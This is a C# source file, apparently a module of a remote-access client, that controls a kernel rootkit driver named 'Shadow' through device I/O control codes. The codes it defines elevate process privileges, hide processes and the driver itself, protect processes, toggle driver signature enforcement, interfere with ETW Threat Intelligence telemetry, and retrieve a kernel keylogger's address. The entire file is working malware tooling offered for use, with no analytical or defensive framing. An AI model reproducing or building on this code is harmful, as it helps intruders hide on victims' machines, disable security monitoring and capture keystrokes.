using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;

namespace Pulsar.Plugins.Client.Modules
{
    public class KernelController : IDisposable
    {
        private SafeFileHandle _handle;
        private const string DeviceName = @"\\.\Shadow";

        #region Native Constants & Structs
        private const uint FILE_DEVICE_UNKNOWN = 0x00000022;
        private const uint METHOD_NEITHER = 3;
        private const uint METHOD_BUFFERED = 0;
        private const uint FILE_ANY_ACCESS = 0;

        private static uint CTL_CODE(uint deviceType, uint function, uint method, uint access)
        {
            return (deviceType << 16) | (access << 14) | (function << 2) | method;
        }

        // IOCTLs mapped from Rust common/src/ioctls.rs
        public static readonly uint ELEVATE_PROCESS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS);
        public static readonly uint HIDE_UNHIDE_PROCESS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS);
        public static readonly uint PROTECT_PROCESS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS);
        public static readonly uint KEYLOGGER = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x841, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint HIDE_UNHIDE_DRIVER = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x821, METHOD_NEITHER, FILE_ANY_ACCESS);
        public static readonly uint ENABLE_DSE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x831, METHOD_NEITHER, FILE_ANY_ACCESS);
        public static readonly uint ETWTI = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x851, METHOD_NEITHER, FILE_ANY_ACCESS);

        [StructLayout(LayoutKind.Sequential)]
        public struct TargetProcess
        {
            public IntPtr Pid;
            public bool Enable;
            public IntPtr Sg;
            public IntPtr Tp;
            public IntPtr ListEntry;
            public int Options;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct TargetDriver
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string Name;
            public bool Enable;
            public IntPtr ListEntry;
            public IntPtr DriverEntry;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BoolStruct
        {
            public bool Enable;
        }
        #endregion

        #region P/Invoke
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern SafeFileHandle CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
            SafeHandle hDevice,
            uint dwIoControlCode,
            IntPtr lpInBuffer,
            uint nInBufferSize,
            IntPtr lpOutBuffer,
            uint nOutBufferSize,
            out uint lpBytesReturned,
            IntPtr lpOverlapped);

        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        #endregion

        public bool Connect()
        {
            _handle = CreateFile(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            return !_handle.IsInvalid;
        }

        public bool SendIoctl<T>(uint ioctlCode, ref T input) where T : struct
        {
            if (_handle == null || _handle.IsInvalid) return false;

            int size = Marshal.SizeOf(input);
            IntPtr buffer = Marshal.AllocHGlobal(size);
            try
            {
                Marshal.StructureToPtr(input, buffer, false);
                uint bytesReturned;
                return DeviceIoControl(_handle, ioctlCode, buffer, (uint)size, IntPtr.Zero, 0, out bytesReturned, IntPtr.Zero);
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IntPtr GetKeyloggerAddress()
        {
            if (_handle == null || _handle.IsInvalid) return IntPtr.Zero;

            IntPtr outBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            try
            {
                uint bytesReturned;
                if (DeviceIoControl(_handle, KEYLOGGER, IntPtr.Zero, 0, outBuffer, (uint)IntPtr.Size, out bytesReturned, IntPtr.Zero))
                {
                    return Marshal.ReadIntPtr(outBuffer);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(outBuffer);
            }
            return IntPtr.Zero;
        }

        public void Dispose()
        {
            _handle?.Dispose();
        }
    }
}
